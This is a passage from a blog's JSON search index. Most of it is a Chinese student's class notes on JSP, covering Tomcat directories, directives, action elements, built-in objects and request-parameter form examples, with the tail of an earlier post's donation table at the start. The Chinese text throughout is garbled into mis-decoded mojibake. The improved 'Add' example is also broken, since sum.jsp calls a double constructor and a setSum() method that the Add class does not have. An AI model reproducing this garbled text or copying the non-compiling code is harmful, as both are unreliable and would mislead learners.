style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["é¶åœº","å†…ç½‘æ¸—é€"],"categories":["Web"]},{"title":"JSPå­¦ä¹ ç¬”è®°","url":"/posts/59789.html","content":"\næœ¬æ–‡ç« æ˜¯Java web è¯¾çš„è¯¾å ‚ç¬”è®°ï¼Œä¸€æ¥è§‰å¾—å­¦ä¸œè¥¿çš„æ—¶å€™è®°å½•ä¸‹æ¥æ•ˆç‡ä¼šæ¯”è¾ƒé«˜ï¼ŒäºŒæ¥è®°å¿†åŠ›ä¸‹é™æ˜æ˜¾ï¼Œæ–¹ä¾¿è‡ªå·±ä»¥åå¤ä¹ å§ğŸ˜ğŸ˜\n\n## JSPç®€ä»‹âœ¨\n\nJSPï¼ˆJava Server Pageï¼ŒJavaæœåŠ¡å™¨é¡µé¢ï¼‰æ˜¯ç”±Sunå…¬å¸å€¡å¯¼ã€è®¸å¤šå…¬å¸å‚ä¸ä¸€èµ·å»ºç«‹çš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯æ ‡å‡†ã€‚JSPæ˜¯åœ¨ä¼ ç»Ÿçš„ç½‘é¡µHTMLæ–‡ä»¶ä¸­åµŒå…¥Javaç¨‹åºä»£ç æ®µå’ŒJSPæ ‡è®°ï¼Œä»è€Œå½¢æˆJSPæ–‡ä»¶ï¼Œåç¼€åä¸ºâ€œ.jspâ€ã€‚\n\n![JSPç¨‹åºè¿è¡Œæœºåˆ¶](https://img.jwt1399.top//img/20200527192324.png)\n\n## JSP å¼€å‘ç¯å¢ƒæ­å»º\n\né¦–å…ˆé…ç½® JDK ç¯å¢ƒï¼Œå¦‚æœªå®‰è£…ï¼Œå¯å‚é˜… [Java å¼€å‘ç¯å¢ƒé…ç½® ](https://www.runoob.com/java/java-environment-setup.html)\n\nç„¶åé…ç½®JSPç¯å¢ƒï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Eclipse ï¼Œå¯ä»¥ç›´æ¥å‚é˜…ï¼š[Eclipse JSP/Servlet ç¯å¢ƒæ­å»º](https://www.runoob.com/jsp/eclipse-jsp.html)ã€‚\n\n| Tomcatç›®å½•   | ç”¨é€”                                                         |\n| ------------ | ------------------------------------------------------------ |\n| /bin         | å­˜æ”¾å¯åŠ¨å’Œå…³é—­Tomcatçš„å‘½ä»¤æ–‡ä»¶                               |\n| /lib         | å­˜æ”¾TomcatæœåŠ¡å™¨åŠæ‰€æœ‰Webåº”ç”¨ç¨‹åºéƒ½å¯ä»¥è®¿é—®çš„JARæ–‡ä»¶         |\n| /conf        | å­˜æ”¾Tomcatçš„é…ç½®æ–‡ä»¶ï¼Œå¦‚server.xml,web.xmlç­‰                 |\n| /logs        | å­˜æ”¾Tomcatçš„æ—¥å¿—æ–‡ä»¶                                         |\n| /temp        | å­˜æ”¾Tomcatè¿è¡Œæ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶                               |\n| **/webapps** | **é€šå¸¸æŠŠWebåº”ç”¨ç¨‹åºçš„ç›®å½•åŠæ–‡ä»¶æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œå…¶ä¸­çš„Rootæ–‡ä»¶å¤¹ä¸ºé»˜è®¤çš„æ ¹ç›®å½•** |\n| /work        | Tomcatå°†JSPç”Ÿæˆçš„Servletæºæ–‡ä»¶å’Œå­—èŠ‚ç æ–‡ä»¶æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹     |\n\n## JSPå…ƒç´ \n\n> JSPçš„æ ‡ç­¾æ˜¯ä»¥â€œ`<%`â€å¼€å§‹ï¼Œä»¥â€œ`%>`â€ç»“æŸçš„ï¼Œè€Œè¢«æ ‡ç­¾åŒ…å›´çš„éƒ¨åˆ†åˆ™ç§°ä¸ºJSPå…ƒç´ çš„å†…å®¹ã€‚\n\nJSPå…ƒç´ åˆ†ä¸º3ç§ç±»å‹ï¼šåŸºæœ¬å…ƒç´ ï¼ŒæŒ‡ä»¤å…ƒç´ ï¼ŒåŠ¨ä½œå…ƒç´ ã€‚\n\n| ç±»å‹     | åŠŸèƒ½                                     | åŒ…å«                              |\n| -------- | ---------------------------------------- | --------------------------------- |\n| åŸºæœ¬å…ƒç´  | è§„èŒƒJSPç½‘é¡µæ‰€ä½¿ç”¨çš„Javaä»£ç               | JSPæ³¨é‡Šã€å£°æ˜ã€è¡¨è¾¾å¼å’Œè„šæœ¬æ®µã€‚   |\n| æŒ‡ä»¤å…ƒç´  | è®¾ç½®jspé¡µé¢ç¼–è¯‘çš„ç›¸å…³å±æ€§                | includeæŒ‡ä»¤ã€pageæŒ‡ä»¤å’ŒtaglibæŒ‡ä»¤ |\n| åŠ¨ä½œå…ƒç´  | ç”¨æ¥å®ç°è¯·æ±‚è½¬å‘ã€åŠ¨æ€åŒ…å«å…¶ä»–æ–‡ä»¶ç­‰åŠŸèƒ½ | includeåŠ¨ä½œå’ŒforwardåŠ¨ä½œ          |\n\n## JSPåŸºæœ¬å…ƒç´ \n\n| åŸºæœ¬å…ƒç´   | è¯­æ³•                        |\n| --------- | --------------------------- |\n| JSPæ³¨é‡Š   | `<%-- æ³¨é‡Š --%>`            |\n| JSPå£°æ˜   | `<%! å£°æ˜å˜é‡ã€æ–¹æ³•å’Œç±» %>` |\n| JSPè¡¨è¾¾å¼ | `<%= è¡¨è¾¾å¼ %>`             |\n| JSPè„šæœ¬æ®µ | `<% ä»£ç ç‰‡æ®µ %>`            |\n\n**JSPç¤ºä¾‹ğŸŒ°**\n\n```html\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>  <%--å¦‚æœæˆ‘ä»¬è¦åœ¨é¡µé¢æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡å¿…é¡»åŠ ä¸Šè¿™å¥--%>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>JSPåŸºæœ¬å…ƒç´ </title>\n</head>\n<body>\n<p>JSPåŸºæœ¬å…ƒç´ </p>\n<%! int x=100,y=500,z;%> <%-- å£°æ˜æ•´å‹å˜é‡x,y,z --%> \n<%     \n    z=x+y;\n%>\n<p>x+yçš„å’Œzä¸ºï¼š<%= z %></p>    <%-- æ˜¾ç¤ºzçš„å€¼ --%> \n</body>\n</html>\n```\n\n**è¡¥å……ï¼š**\n\nHTMLæ³¨é‡Šï¼š  `<!-- è¦æ·»åŠ çš„æ–‡æœ¬æ³¨é‡Š -->`\n\nJAVAæ³¨é‡Šï¼š`<% //è¦æ·»åŠ çš„æ–‡æœ¬æ³¨é‡Š %>`  æˆ–  `<% /*è¦æ·»åŠ çš„æ–‡æœ¬æ³¨é‡Š*/ %>`\n\n## JSP æŒ‡ä»¤å…ƒç´ \n\n| **æŒ‡ä»¤**           | **æè¿°**                                                |\n| :----------------- | :------------------------------------------------------ |\n| <%@ page ... %>    | å®šä¹‰ç½‘é¡µä¾èµ–å±æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢ã€ç¼“å­˜éœ€æ±‚ç­‰ç­‰ |\n| <%@ include ... %> | åŒ…å«å…¶ä»–æ–‡ä»¶                                            |\n| <%@ taglib ... %>  | å¼•å…¥æ ‡ç­¾åº“çš„å®šä¹‰                                        |\n\n### PageæŒ‡ä»¤\n\n```html\n<%@ page å±æ€§1=\"å€¼1\" å±æ€§2=\"å€¼2\" ... %>\n```\n\n| å±æ€§             | è¯´æ˜                                                         | è®¾ç½®å€¼ç¤ºä¾‹                     |\n| ---------------- | ------------------------------------------------------------ | ------------------------------ |\n| **language**     | **æŒ‡å®šç”¨åˆ°çš„è„šæœ¬è¯­è¨€ï¼Œé»˜è®¤æ˜¯Java**                           | **<%@page  language=\"java\"%>** |\n| **import**       | **ç”¨äºå¯¼å…¥javaåŒ…æˆ–javaç±»**                                   | **import=\"Java.util.Date\"**    |\n| **pageEncoding** | **æŒ‡å®šé¡µé¢æ–‡æ¡£æ‰€ç”¨ç¼–ç **                                     | **pageEncoding=\"UTF-8\"**       |\n| extends          | JSPè½¬æ¢æˆServletåç»§æ‰¿çš„ç±»                                   | Java.servlet.http.HttpServlet  |\n| **session**      | **æŒ‡å®šè¯¥é¡µé¢æ˜¯å¦å‚ä¸åˆ°HTTPä¼šè¯ä¸­**                           | **true æˆ–  false**             |\n| buffer           | è®¾ç½®outå¯¹è±¡ç¼“å†²åŒºå¤§å°                                        | 8kb                            |\n| autoflush        | è®¾ç½®æ˜¯å¦è‡ªåŠ¨åˆ·æ–°ç¼“å†²åŒº                                       | true  æˆ– false                 |\n| isThreadSafe     | è®¾ç½®è¯¥é¡µé¢æ˜¯å¦æ˜¯çº¿ç¨‹å®‰å…¨                                     | true  æˆ– false                 |\n| info             | è®¾ç½®é¡µé¢çš„ç›¸å…³ä¿¡æ¯                                           | ç½‘ç«™ä¸»é¡µé¢                     |\n| errorPage        | è®¾ç½®å½“é¡µé¢å‡ºé”™åè¦è·³è½¬åˆ°çš„é¡µé¢                               | /error/jsp-error.jsp           |\n| **contentType**  | **è®¾è®¡å“åº”jspé¡µé¢çš„MIMEç±»å‹å’Œå­—ç¬¦ç¼–ç ï¼Œå³å‘Šè¯‰æµè§ˆå™¨ç”¨ä»€ä¹ˆç¼–ç è§£ææœåŠ¡å™¨è¿”å›çš„é¡µé¢** | **text/html;charset=utf-8**    |\n| isErrorPage      | è®¾ç½®æ˜¯å¦æ˜¯ä¸€ä¸ªé”™è¯¯å¤„ç†é¡µé¢                                   | true  æˆ– false                 |\n| isELIgnord       | è®¾ç½®æ˜¯å¦å¿½ç•¥æ­£åˆ™è¡¨è¾¾å¼                                       | true  æˆ– false                 |\n\n### IncludeæŒ‡ä»¤\n\n```html\n<%@ include file=\"æ–‡ä»¶è·¯å¾„\" %>\n```\n\n### TaglibæŒ‡ä»¤\n\n```html\n<%@ taglib uri=\"uri\" prefix=\"prefixOfTag\" %>\n```\n\n## JSPåŠ¨ä½œå…ƒç´ \n\n| è¯­æ³•                | æè¿°                                                         |\n| ------------------- | ------------------------------------------------------------ |\n| `<jsp:include>`     | åœ¨é¡µé¢å¾—åˆ°è¯·æ±‚æ—¶åŠ¨æ€åŒ…å«ä¸€ä¸ªæ–‡ä»¶ã€‚                           |\n| `<jsp:forward>`     | æŠŠè¯·æ±‚è½¬åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚                                     |\n| `<jsp:plugin>`      | è¿æ¥å®¢æˆ·ç«¯çš„Appletæˆ–Beanæ’ä»¶ã€‚                               |\n| `<jsp:useBean>`     | åº”ç”¨JavaBeanç»„å»ºã€‚                                           |\n| `<jsp:setProperty>` | è®¾ç½®JavaBeançš„å±æ€§å€¼ã€‚                                       |\n| `<jsp:getProperty>` | è·å–JavaBeançš„å±æ€§å€¼å¹¶è¾“å‡ºã€‚                                 |\n| `<jsp:param>`       | å®ç°å‚æ•°ä¼ é€’å­åŠ¨ä½œå…ƒç´ ï¼Œparamæ ‡è®°ä¸èƒ½ç‹¬ç«‹ä½¿ç”¨ï¼Œéœ€ä½œä¸º`<jsp:include>ã€<jsp:forward>`æ ‡è®°çš„å­æ ‡è®°æ¥ä½¿ç”¨ã€‚ |\n\n### `<jsp:include>`\n\n> ç”¨äºå‘å½“å‰çš„é¡µé¢ä¸­åŠ¨æ€åŒ…å«å…¶ä»–çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯åŠ¨æ€æ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯é™æ€æ–‡ä»¶ã€‚\n\n**è¯­æ³•ï¼š**\n\n```java\n<jsp:include page=\"è¢«åŒ…å«æ–‡ä»¶çš„è·¯å¾„\" flush=\"true|false\"/>\n```\n\nflushï¼šå®šä¹‰åœ¨åŒ…å«èµ„æºå‰æ˜¯å¦åˆ·æ–°ç¼“å­˜åŒºã€‚\n\n**å‘è¢«åŒ…å«çš„åŠ¨æ€é¡µé¢ä¸­ä¼ é€’å‚æ•°ï¼š**\n\n```java\n<jsp:include page=\"è¢«åŒ…å«æ–‡ä»¶çš„è·¯å¾„\" flush=\"true|false\">\n  \t<jsp:param name=\"å‚æ•°åç§°\" value=\"å‚æ•°å€¼\"/>\n</jsp:include>\n```\n\n`<jsp:include>`åŠ¨ä½œä¸`<%@ include file=â€œæ–‡ä»¶è·¯å¾„â€%>`çš„åŒºåˆ«ï¼š\n\n![](https://img.jwt1399.top//img/20200527213606.png)\n\n### `<jsp:forward>`\n\n> ç”¨æ¥å°†è¯·æ±‚è½¬å‘åˆ°å¦å¤–ä¸€ä¸ªJSPã€HTMLæˆ–ç›¸å…³çš„èµ„æºæ–‡ä»¶ä¸­ã€‚\n\n**è¯­æ³•ï¼š**\n\n```java\n<jsp:forward page=\"æ–‡ä»¶è·¯å¾„\"/>\n```\n\nå¦‚æœè½¬å‘çš„ç›®æ ‡æ˜¯ä¸€ä¸ªåŠ¨æ€æ–‡ä»¶ï¼Œè¿˜å¯ä»¥å‘è¯¥æ–‡ä»¶ä¸­ä¼ é€’å‚æ•°ï¼Œä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š\n\n```java\n<jsp:forward page=\"è¢«åŒ…å«æ–‡ä»¶çš„è·¯å¾„\">\n  \t<jsp:param name=\"å‚æ•°åç§°\" value=\"å‚æ•°å€¼\"/>\n</jsp:forward>\n```\n\n## JSPå†…ç½®å¯¹è±¡\n\n> JSPä¸­ä¸ºäº†ä¾¿äºæ•°æ®ä¿¡æ¯çš„ä¿å­˜ã€ä¼ é€’ã€è·å–ç­‰æ“ä½œï¼Œæä¾›äº†9ä¸ªå†…ç½®å¯¹è±¡ï¼Œè¿™äº›å†…ç½®å¯¹è±¡ç”±JSPå¼•æ“ï¼ˆæˆ–å®¹å™¨ï¼‰è‡ªåŠ¨åˆ›å»ºï¼Œå¼€å‘è€…å¯åœ¨å†…ç½®å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå†…åœ¨è„šæœ¬ä»£ç å’Œè¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚\n\n| å¯¹è±¡åç§°        | æ‰€  å±  ç±»  å‹                             | æœ‰æ•ˆèŒƒå›´        | è¯´æ˜                                                         |\n| --------------- | ------------------------------------------ | --------------- | ------------------------------------------------------------ |\n| **application** | **javax.servlet.ServletContext**           | **application** | **ä»£è¡¨åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå…è®¸JSPé¡µé¢ä¸åŒ…æ‹¬åœ¨åŒä¸€åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•Webç»„ä»¶å…±äº«ä¿¡æ¯** |\n| config          | javax.servlet.ServletConfig                | page            | å…è®¸å°†åˆå§‹åŒ–æ•°æ®ä¼ é€’ç»™ä¸€ä¸ªJSPé¡µé¢                            |\n| exception       | java.lang.Throwable                        | page            | è¯¥å¯¹è±¡å«æœ‰åªèƒ½ç”±æŒ‡å®šçš„JSPâ€œé”™è¯¯å¤„ç†é¡µé¢â€è®¿é—®çš„å¼‚å¸¸æ•°æ®        |\n| **out**         | **javax.servlet.jsp.JspWriter**            | **page**        | **æä¾›å¯¹è¾“å‡ºæµçš„è®¿é—®**                                       |\n| page            | javax.servlet.jsp.HttpJspPage              | page            | ä»£è¡¨JSPé¡µé¢å¯¹åº”çš„Servletç±»å®ä¾‹                               |\n| pageContext     | javax.servlet.jsp.PageContext              | page            | æ˜¯JSPé¡µé¢æœ¬èº«çš„ä¸Šä¸‹æ–‡ï¼Œå®ƒæä¾›äº†å”¯ä¸€ä¸€ç»„æ–¹æ³•æ¥ç®¡ç†å…·æœ‰ä¸åŒä½œç”¨åŸŸçš„å±æ€§ |\n| **request**     | **javax.servlet.http.HttpServletRequest**  | **request**     | **æä¾›å¯¹è¯·æ±‚æ•°æ®çš„è®¿é—®ï¼ŒåŒæ—¶è¿˜æä¾›ç”¨äºåŠ å…¥ç‰¹å®šè¯·æ±‚æ•°æ®çš„ä¸Šä¸‹æ–‡** |\n| **response**    | **javax.servlet.http.HttpServletResponse** | **page**        | **è¯¥å¯¹è±¡ç”¨æ¥å‘å®¢æˆ·ç«¯è¾“å…¥æ•°æ®**                               |\n| **session**     | **javax.servlet.http.HttpSession**         | **session**     | **ç”¨æ¥ä¿å­˜åœ¨æœåŠ¡å™¨ä¸ä¸€ä¸ªå®¢æˆ·ç«¯ä¹‹é—´éœ€è¦ä¿å­˜çš„æ•°æ®ï¼Œå½“å®¢æˆ·ç«¯å…³é—­ç½‘ç«™çš„æ‰€æœ‰ç½‘é¡µæ—¶ï¼Œsessionå˜é‡ä¼šè‡ªåŠ¨æ¶ˆå¤±** |\n\n### requestå¯¹è±¡çš„å¸¸ç”¨æ–¹æ³•ğŸ±â€ğŸ\n\n> å½“å®¢æˆ·ç«¯é€šè¿‡HTTPåè®®è¯·æ±‚æˆ–è½¬å‘ä¸€ä¸ªJSPé¡µé¢ï¼ŒJSPå®¹å™¨ä¼šè‡ªåŠ¨åˆ›å»ºrequestå¯¹è±¡å¹¶å°†è¯·æ±‚ä¿¡æ¯åŒ…è£…åˆ°requestå¯¹è±¡ä¸­ï¼Œå½“JSPå®¹å™¨å¤„ç†å®Œè¯·æ±‚åï¼Œrequestå¯¹è±¡å°±ä¼šé”€æ¯ã€‚requestå¯¹è±¡åŒ…å«äº†ç”¨æˆ·æäº¤çš„ä¿¡æ¯ä»¥åŠå®¢æˆ·ç«¯ä¿¡æ¯ã€‚\n\n| æ–¹æ³•                                   | è¯´æ˜                                                         |\n| -------------------------------------- | ------------------------------------------------------------ |\n| `setAttribute(String name,Object obj)` | `ç”¨äºè®¾ç½®requestä¸­çš„å±æ€§åŠå…¶å±æ€§å€¼`                          |\n| `getAttribute(String name)`            | `ç”¨äºè¿”å›nameæŒ‡å®šçš„å±æ€§å€¼ï¼Œè‹¥ä¸å­˜åœ¨æŒ‡å®šçš„å±æ€§ï¼Œå°±è¿”å›nullã€‚` |\n| `removeAttribute(String name)`         | `ç”¨äºåˆ é™¤è¯·æ±‚ä¸­çš„ä¸€ä¸ªå±æ€§`                                   |\n| `getParameter(String name)`            | `ç”¨äºè·å¾—å®¢æˆ·ç«¯ä¼ é€ç»™æœåŠ¡å™¨ç«¯çš„å‚æ•°å€¼`                       |\n| getParameterNames()                    | ç”¨äºè·å¾—å®¢æˆ·ç«¯ä¼ é€ç»™æœåŠ¡å™¨ç«¯çš„æ‰€æœ‰å‚æ•°åå­—                   |\n| `getParameterValues(String name)`      | `ç”¨äºè·å¾—æŒ‡å®šå‚æ•°çš„æ‰€æœ‰å€¼ï¼ˆè¡¨å•ä¸­å¤é€‰æ¡†åŒåï¼Œåˆ—è¡¨é¡¹å¤šé€‰æ—¶ï¼‰` |\n| getCookies()                           | ç”¨äºè¿”å›å®¢æˆ·ç«¯çš„æ‰€æœ‰Cookieå¯¹è±¡ï¼Œç»“æœæ˜¯ä¸€ä¸ªCookieæ•°ç»„         |\n| getCharacterEncoding()                 | è¿”å›è¯·æ±‚ä¸­çš„å­—ç¬¦ç¼–ç æ–¹å¼                                     |\n| getRequestURI()                        | ç”¨äºè·å–å‘å‡ºè¯·æ±‚å­—ç¬¦ä¸²çš„å®¢æˆ·ç«¯åœ°å€                           |\n| getRemoteAddr()                        | ç”¨äºè·å–å®¢æˆ·ç«¯IPåœ°å€                                         |\n| getRemoteHost()                        | ç”¨äºè·å–å®¢æˆ·ç«¯åå­—                                           |\n| getSession([Boolean  create])          | ç”¨äºè¿”å›å’Œè¯·æ±‚ç›¸å…³çš„session                                  |\n| getServerName()                        | ç”¨äºè·å–æœåŠ¡å™¨çš„åå­—                                         |\n| getServletPath()                       | ç”¨äºè·å–å®¢æˆ·ç«¯æ‰€è¯·æ±‚çš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶è·¯å¾„ã€‚                   |\n| getServerPort()                        | ç”¨äºè·å–æœåŠ¡å™¨çš„ç«¯å£å·                                       |\n\n#### è®¿é—®è¯·æ±‚å‚æ•°çš„æ–¹æ³•\n\n```java\nString å˜é‡å = request.getParameter(\"å®¢æˆ·ç«¯æä¾›å‚æ•°çš„nameå±æ€§å\");\n```\n\n**å®åˆ—ğŸŒ°**\n\n> `é¢˜ç›®ï¼š`åˆ©ç”¨è¡¨å•ä¼ é€’å‚æ•°ã€‚æäº¤é¡µé¢ä¸Šæœ‰ä¸¤ä¸ªæ–‡æœ¬æ¡†ï¼Œåœ¨æ–‡æœ¬æ¡†ä¸­è¾“å…¥å§“åå’Œç”µè¯å·ç ï¼Œå•å‡»â€œæäº¤â€æŒ‰é’®åï¼Œç”±æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºæ¥æ”¶æäº¤çš„è¡¨å•ä¿¡æ¯å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚\n\n![](https://img.jwt1399.top//img/20200528095309.png)\n\n`infoInput.jsp`\n\n```java\n<form action= \"infoReceive.jsp\"  method=\"post\">\n     å§“å: <input type=\"text\" name= \"rdName\"> <br>\n     ç”µè¯: <input  type=\"tel\" name= \"phName\"> <br>\n     <input type=\"submit\" value=\"æ äº¤\">\n</form>\n```\n\n`infoReceive.jsp`\n\n```java\n<body>\n    <%   String str1=request.getParameter(\"rdName\");\n         String str2=request.getParameter(\"phName\");\n    %>\n   <font face=\"æ¥·ä½“\" size=4 color=blue> \n        æ‚¨è¾“å…¥çš„ä¿¡æ¯ä¸ºï¼š<br> \n        å§“åï¼š<%=str1%><br>\n        ç”µè¯ï¼š<%=str2%><br> \n  </font>\n</body>\n```\n\n| infoInput.jsp                                        | infoReceive.jsp                                      |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200528094724.png) | ![](https://img.jwt1399.top//img/20200528094729.png) |\n\n#### æ–°å±æ€§çš„è®¾ç½®å’Œè·å–\n\n**è®¾ç½®æ•°æ®çš„æ–¹æ³•æ ¼å¼ï¼š**     \n\n```java\nvoid request.setAttribute(String name,Object);\n```\n\nå‚æ•°nameè¡¨ç¤ºé”®åï¼Œä¸ºStringç±»å‹ï¼›å‚æ•°objectæ˜¯é”®å€¼ï¼Œä¸ºObjectç±»å‹ï¼Œå®ƒä»£è¡¨éœ€è¦ä¿å­˜åœ¨requestèŒƒå›´å†…çš„æ•°æ®ã€‚\n\n**è·å–æ•°æ®çš„æ–¹æ³•æ ¼å¼ï¼š**\n\n```java\nObject request.getAttribute(String name);\n```\n\nå‚æ•°nameè¡¨ç¤ºé”®åï¼Œæ‰€è·å–çš„æ•°æ®ç±»å‹æ˜¯ç”±setAttribute(\"name\",obj)ä¸­çš„objç±»å‹å†³å®šçš„ã€‚\n\n**å®åˆ—ğŸŒ°**\n\n> `é¢˜ç›®ï¼š`è®¾è®¡ä¸€ä¸ªWebç¨‹åºï¼Œå®ç°ç”±æäº¤é¡µé¢æäº¤çš„ä»»æ„ä¸¤ä¸ªå®æ•°çš„å’Œï¼Œå¹¶ç»™å‡ºç»“æœæ˜¾ç¤ºã€‚\n\n![](https://img.jwt1399.top//img/20200607101236.png)\n\n`input.jsp`\n\n```html\n<form action=\"sum.jsp\" method=post>\n    æ•°æ®1: <input type=\"text\" name=\"shuju1\" ><br>\n    æ•°æ®2: <input type=\"text\" name=\"shuju2\" ><br>\n    <input type=\"submit\" value=\"æäº¤\" >\n</form>\n```\n\n`sum.jsp`\n\n```java\n<%  String str1=request.getParameter(\"shuju1\");\n    String str2=request.getParameter(\"shuju2\");\n    double s1=Double.parseDouble(str1);\n    double s2=Double.parseDouble(str2);\n    double s3=s1+s2;\n    request.setAttribute(\"st1\",s1);\n    request.setAttribute(\"st2\",s2);\n    request.setAttribute(\"st3\",s3);\n%>\n<jsp:forward page=\"output.jsp\"></jsp:forward>\n```\n\n`output.jsp`\n\n```java\nåˆ©ç”¨getAttributeæ–¹æ³•è·å–åˆ©ç”¨setAttributeæ–¹æ³•ä¿å­˜çš„å€¼ï¼Œå¹¶æ˜¾ç¤ºï¼<br>\n<% Double  a1=(Double)request.getAttribute(\"st1\");\n   Double  a2=(Double)request.getAttribute(\"st2\");\n   Double  a3=(Double)request.getAttribute(\"st3\");\n%>\n <%=a1%>+<%=a2%>=<%=a3%><br>\nåˆ©ç”¨getParameteræ–¹æ³•è·å–è·å–è¯·æ±‚å‚æ•°ï¼Œå¹¶æ˜¾ç¤ºï¼<br>\n<%   String  s1=request.getParameter(\"shuju1\");\n     String  s2=request.getParameter(\"shuju2\");\n%>       \n <%=s1%>+<%=s2%>=<%=a3%><br>\n```\n\n| input.jsp                                            | output.jsp                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200607115245.png) | ![](https://img.jwt1399.top//img/20200607115236.png) |\n\nä½†æ˜¯ä¸Šé¢æŒ¨ä¸ªæ•°æ®è·å¾—ã€å­˜å‚¨å’Œå¤„ç†ï¼Œæ•°æ®å°è£…æ€§å·®ï¼Œæ“ä½œä¸ä¾¿ï¼š\n\n**æ”¹è¿›æ€è·¯ï¼š**\n\nï¼ˆ1ï¼‰åˆ›å»ºä¸€ä¸ªAddç±»ï¼Œå°è£…æ“ä½œæ•°å’Œæ“ä½œæ–¹æ³•ï¼›\n\nï¼ˆ2ï¼‰åœ¨sumé¡µé¢ä¸­ä½¿ç”¨Addç±»å¯¹è±¡è®¡ç®—å‡ºç»“æœï¼Œå¹¶ä½¿ç”¨requestçš„setAttribute (String,Object)æ–¹æ³•ä¿å­˜Addç±»å¯¹è±¡ï¼›\n\nï¼ˆ3ï¼‰åœ¨output.jspé¡µé¢ä¸­ä½¿ç”¨requestçš„getAttribute(String)è·å¾—Addç±»å¯¹è±¡ï¼Œå¹¶æ˜¾ç¤º\n\nåˆ›å»ºä¸€ä¸ªAddç±»ï¼Œå°è£…æ“ä½œæ•°å’Œæ“ä½œæ–¹æ³•ï¼›\n\n```java\npackage beans;\n\npublic class Add {\nprivate int shuju1;\nprivate int shuju2;\nprivate int sum;\n\npublic Add() {}\npublic int getShuju1() {\nreturn shuju1;\n}\npublic void setShuju1(int shuju1) {\nthis.shuju1 = shuju1;\n}\npublic int getShuju2() {\nreturn shuju2;\n}\npublic void setShuju2(int shuju2) {\nthis.shuju2 = shuju2;\n}\npublic int getSum() {\nreturn shuju1 + shuju2;\n}\n}\n\n```\n\nåœ¨`sum.jsp`é¡µé¢ä¸­ä½¿ç”¨Addç±»å¯¹è±¡è®¡ç®—å‡ºç»“æœï¼Œå¹¶ä½¿ç”¨requestçš„setAttribute (String,Object)æ–¹æ³•ä¿å­˜Addç±»å¯¹è±¡ï¼›\n\n```html\n<% String str1=request.getParameter(\"shuju1\");\n   String str2=request.getParameter(\"shuju2\");\n   double s1=Double.parseDouble(str1);\n   double s2=Double.parseDouble(str2);\n   Add add = new Add(s1,s2);\n   add.setSum();\n   request.setAttribute(\"a_dd\",add);\n%>\n<jsp:forward page=\"output.jsp\"></jsp:forward>\n```\n\nåœ¨`output.jsp`é¡µé¢ä¸­ä½¿ç”¨requestçš„getAttribute(String)è·å¾—Addç±»å¯¹è±¡ï¼Œå¹¶æ˜¾ç¤º\n\n```html\nåˆ©ç”¨getAttributeæ–¹æ³•è·å–åˆ©ç”¨setAttributeæ–¹æ³•ä¿å­˜çš„Addå¯¹è±¡ï¼Œå¹¶æ˜¾ç¤ºå…¶å±æ€§ï¼<br>\n<% Add add = (Add)request.getAttribute(\"a_dd\"); %> \n    æ±‚å’Œç»“æœï¼š<br>\n<%=add.getShuju1()%> + <%=add.getShuju2()%> = <%=add.getSum()%><br>\n```\n\n| input.jsp                                            | output.jsp                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200607115245.png) | ![](https://img.jwt1399.top//img/20200607120221.png) |\n\n#### è·å–å®¢æˆ·ç«¯ä¿¡æ¯\n\n`input.jsp`\n\n```java\n<form action=\"ch03_10_showInfo.jsp\" method=post>\n    æ•°æ®1: <input type=\"text\" name=\"shuju1\" ><br>\n    æ•°æ®2: <input type=\"text\" name=\"shuju2\" ><br>\n    <input type=\"submit\" value=\"æäº¤\" >\n</form>\n```\n\n`ch03_10_showInfo.jsp`\n\n```java\n<body>\n    <font color=\"blue\">è¡¨å•æäº¤çš„ä¿¡æ¯ï¼š</font><br>\n    è¾“å…¥çš„ç¬¬1ä¸ªæ•°æ®æ˜¯ï¼š<%=request.getParameter(\"shuju1\") %><br>\n    è¾“å…¥çš„ç¬¬2ä¸ªæ•°æ®æ˜¯ï¼š<%=request.getParameter(\"shuju2\") %><br><br>\n    <font  color=\"red\">å®¢æˆ·ç«¯ä¿¡æ¯ï¼š</font><br>\n    å®¢æˆ·ç«¯åè®®åå’Œç‰ˆæœ¬å·ï¼š <%=request.getProtocol() %><br> \n    å®¢æˆ·æœºåï¼š <%=request.getRemoteHost() %><br>\n    å®¢æˆ·æœºçš„IPåœ°å€ï¼š <%= request.getRemoteAddr() %><br>\n    å®¢æˆ·æäº¤ä¿¡æ¯çš„é•¿åº¦ï¼š <%= request.getContentLength() %><br>\n    å®¢æˆ·æäº¤ä¿¡æ¯çš„æ–¹å¼ï¼š <%= request.getMethod() %><br>\n    HTTPå¤´æ–‡ä»¶ä¸­Hostå€¼ï¼š <%= request.getHeader(\"Host\") %><br>\n    æœåŠ¡å™¨åï¼š <%= 